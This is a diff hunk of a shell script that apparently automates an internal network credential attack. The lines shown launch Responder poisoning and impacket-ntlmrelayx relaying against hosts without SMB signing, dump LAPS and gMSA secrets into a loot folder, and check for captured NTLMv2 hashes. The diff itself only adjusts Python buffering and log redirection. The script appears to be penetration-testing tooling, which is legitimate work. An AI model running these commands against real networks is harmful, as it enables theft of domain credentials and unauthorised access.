@@ -62,15 +62,21 @@ fi
 
 #Responder with 300sec timeout in bg
 echo '! > Starting impacket-ntlmrelayx && Responder'
+#Python unbuffered for logging to file
+export PYTHONUNBUFFERED=TRUE
+
 timeout 300 impacket-ntlmrelayx -6 -ts -ra --dump-laps --dump-gmsa -l /root/output/loot -of /root/output/loot/ntlm_relay_ntlmv2.txt -smb2support -tf /root/output/list/smb_sign_off.txt &> /root/output/relay.txt &
-timeout 300 responder -I eth0 -wvFP 2>&1 >> /root/output/responder.txt &
+timeout 300 responder -I eth0 -wvFP &> /root/output/responder.txt &
 
 PID_RELAY=`jobs -l | awk '/ntlmrelayx/ {print$2}'`
 PID_RESPONDER=`jobs -l | awk '/responder/ {print$2}'`
 
 wait $PID_RESPONDER
 wait $PID_RELAY
-	
+
+#Python unbuffered reset to default
+unset PYTHONUNBUFFERED
+
 if [ -s /root/output/loot/ntlm_relay_ntlmv2.txt ]; then
 	echo '! > Got Hashes!'
 	exit 0
